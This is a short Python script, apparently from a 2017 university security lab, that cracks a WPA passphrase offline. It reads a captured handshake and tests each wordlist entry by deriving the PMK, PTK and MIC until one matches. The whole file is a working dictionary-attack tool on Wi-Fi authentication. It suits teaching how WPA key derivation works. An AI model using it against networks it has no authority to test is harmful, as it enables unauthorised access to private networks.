#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
wpa bruteforce
"""

__author__ = "Abraham Rubinstein, Yann Lederrey, Laurent Scherer"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from wpa_key_derivation import *

if __name__ == '__main__':
    wpa = rdpcap("wpa_handshake.cap")

    ssid, APmac, Clientmac = getAssociationRequestPackets(wpa)
    ANonce, SNonce, mic_to_test, data = getHandshake(wpa)
    # this string is used in the pseudo-random function
    A = "Pairwise key expansion"

    B = min(APmac, Clientmac) \
        + max(APmac, Clientmac) \
        + min(ANonce, SNonce) \
        + max(ANonce, SNonce)  # used in pseudo-random function
    ssid = str.encode(ssid)

    print('[*] Loading wordlist and trying keys...')
    f = open("wordlist.txt")
    for w in f:
        w = w[:-1]
        print(' ' * 20, end = '', flush = True)
        print(f"\r[*] Trying {w}...", end = '', flush = True)
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(w)
        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
        # expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact,
        # KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16], data, hashlib.sha1)
        if mic.digest()[:-4] == mic_to_test:
            print(f'\n[*] Found the pass phrase:\t\t{w}\n')
            printResultsKeyExpansion(pmk, ptk, mic)
            break
    f.close()
